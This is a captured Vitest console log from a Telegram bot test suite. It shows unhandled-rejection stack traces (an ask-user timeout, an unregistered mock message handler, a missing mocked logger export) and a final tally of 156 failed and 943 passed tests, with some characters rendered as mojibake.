     75|           reject(new Error('Timeout: no se recibiâ”œâ”‚ respuesta del usuarÃ”Ã‡Âª
       |                  ^
     76|         }, config.ASK_USER_TIMEOUT);
     77|       });
 Ã”Ã˜Â» callTimer ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2070:24
 Ã”Ã˜Â» Object.next ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2776:17
 Ã”Ã˜Â» Immediate.<anonymous> ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/vi.D6IHiKAI.js:2874:43
 Ã”Ã˜Â» processImmediate node:internal/timers:483:21

This error originated in "tests/tools-ask-user.test.ts" test file. It doesn't mean the error was thrown inside the file itself, but while it was running.
The latest test that might've caused the error is "should handle rapid cancel/restart cycles". It might mean one of the following:
- The error was thrown, while Vitest was running this test.
- If the error occurred after the test had been completed, this was the last documented test before it was thrown.

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â» Unhandled Rejection Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»
Error: Message handler not registered
 Ã”Ã˜Â» MockBot.simulateMessage tests/integration/telegram-e2e.test.ts:141:13
    139|   async simulateMessage(chatId: number, userId: number, text: string):Ã”Ã‡Âª
    140|     if (!this.messageHandler) {
    141|       throw new Error('Message handler not registered');
       |             ^
    142|     }
    143| 
 Ã”Ã˜Â» tests/integration/telegram-e2e.test.ts:687:38
 Ã”Ã˜Â» processTicksAndRejections node:internal/process/task_queues:95:5
 Ã”Ã˜Â» ../MCP%20Copilot%20Telegram/node_modules/@vitest/runner/dist/index.js:529:5
 Ã”Ã˜Â» runTest ../MCP%20Copilot%20Telegram/node_modules/@vitest/runner/dist/index.js:982:11
 Ã”Ã˜Â» runSuite ../MCP%20Copilot%20Telegram/node_modules/@vitest/runner/dist/index.js:1131:15
 Ã”Ã˜Â» runSuite ../MCP%20Copilot%20Telegram/node_modules/@vitest/runner/dist/index.js:1131:15
 Ã”Ã˜Â» runSuite ../MCP%20Copilot%20Telegram/node_modules/@vitest/runner/dist/index.js:1131:15
 Ã”Ã˜Â» runFiles ../MCP%20Copilot%20Telegram/node_modules/@vitest/runner/dist/index.js:1188:5
 Ã”Ã˜Â» startTests ../MCP%20Copilot%20Telegram/node_modules/@vitest/runner/dist/index.js:1197:3

This error originated in "tests/integration/telegram-e2e.test.ts" test file. It doesn't mean the error was thrown inside the file itself, but while it was running.
The latest test that might've caused the error is "should handle concurrent stop commands gracefully". It might mean one of the following:
- The error was thrown, while Vitest was running this test.
- If the error occurred after the test had been completed, this was the last documented test before it was thrown.

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â» Unhandled Rejection Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»
Error: [vitest] No "flushLogger" export is defined on the "../../src/utils/logger" mock. Did you forget to return it from "vi.mock"?
If you need to partially mock a module, you can use "importOriginal" helper inside:

vi.mock(import("../../src/utils/logger"), async (importOriginal) => {
  const actual = await importOriginal()
  return {
    ...actual,
    // your mocked methods
  }
})

 Ã”Ã˜Â» VitestMocker.createError ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/execute._eQQfgI8.js:320:19
 Ã”Ã˜Â» Object.get ../MCP%20Copilot%20Telegram/node_modules/vitest/dist/chunks/execute._eQQfgI8.js:388:22
 Ã”Ã˜Â» src/index.ts:411:3
    409| main().catch((err) => {
    410|   logger.error('Error fatal', { err });
    411|   flushLogger().finally(() => process.exit(1));
       |   ^
    412| });
    413| 
 Ã”Ã˜Â» processTicksAndRejections node:internal/process/task_queues:95:5

This error originated in "tests/integration/telegram-e2e.test.ts" test file. It doesn't mean the error was thrown inside the file itself, but while it was running.
The latest test that might've caused the error is "tests/integration/telegram-e2e.test.ts". It might mean one of the following:
- The error was thrown, while Vitest was running this test.
- If the error occurred after the test had been completed, this was the last documented test before it was thrown.
[31mÃ”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[39m

[2m Test Files [22m [1m[31m29 failed[39m[22m[2m | [22m[1m[32m40 passed[39m[22m[90m (69)[39m
[2m      Tests [22m [1m[31m156 failed[39m[22m[2m | [22m[1m[32m943 passed[39m[22m[90m (1099)[39m
[2m     Errors [22m [1m[31m25 errors[39m[22m
[2m   Start at [22m 18:11:27
[2m   Duration [22m 21.30s[2m (transform 6.62s, setup 0ms, collect 28.37s, tests 68.06s, environment 36ms, prepare 22.58s)[22m

